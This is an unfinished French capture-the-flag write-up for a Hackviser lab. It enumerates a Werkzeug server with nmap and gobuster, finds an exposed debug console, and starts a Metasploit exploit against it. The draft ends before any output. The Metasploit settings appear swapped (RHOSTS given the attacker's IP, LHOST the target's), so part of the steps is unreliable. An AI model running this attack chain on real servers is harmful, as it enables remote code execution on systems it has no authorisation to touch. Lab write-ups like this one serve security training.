---
# Imported from Obsidian: CTF/hackviser/Warmups Work Stuff.md
# Draft: incomplete: stops mid-exploitation, no flag
title: Warmups Work Stuff
category: Boot2Root
ctf: Hackviser
date: 2026-01-19
summary: Dans ce Lab, nous allons exploiter Waerkzeup ( WSGI)
tags:
- boot2root
- gobuster
- hackviser
- metasploit
- nmap
- searchsploit
- werkzeug
- wsgi
lang: fr
draft: true
imported: true
---

**Description:**
Werkzeug is a Python-based web application toolkit and is used by popular web frameworks. It facilitates many complex functions related to the HTTP protocol by providing flexibility and modularity.  

Dans ce Lab, nous allons exploiter Waerkzeup ( WSGI)

#### Étape 1:  Énumération 

- **Scan Nmap**

**Commande:**
```
Nmap -sC -sV 172.20.7.89
```

Un seul Port ouvert (80)  avec pour service Werkzeug
![Screenshot](./images/obsidian/warmups-work-stuff/pasted-image-20260119115227.png)

Commande:
```
gobuster dir -u http://172.20.7.89/ -w /usr/share/wordlists/dirb/common.txt
```
![Screenshot](./images/obsidian/warmups-work-stuff/pasted-image-20260119114741.png)

Boom on a trouvé un endpoint #/console.  Une console Interactive utilisée pour le **débogage** 
Ex![Screenshot](./images/obsidian/warmups-work-stuff/pasted-image-20260119115031.png)
- **Recherche d'exploit** avec Searchsploit

![Screenshot](./images/obsidian/warmups-work-stuff/pasted-image-20260119115507.png)

Tous ces exploits exploitent le #/console 

Étape 2: Exploitation avec metasploit

Commande:
```
search werkzeug
use 0 
```

![Screenshot](./images/obsidian/warmups-work-stuff/pasted-image-20260119122236.png)
Ensuite 
```
options pour modifier les options

set RHOSTS MY_IP

set LHOST Target_IP

set AUTHMOD none   //Pour désactiver les méthodes d'authentification

exploit //exploiter 
```
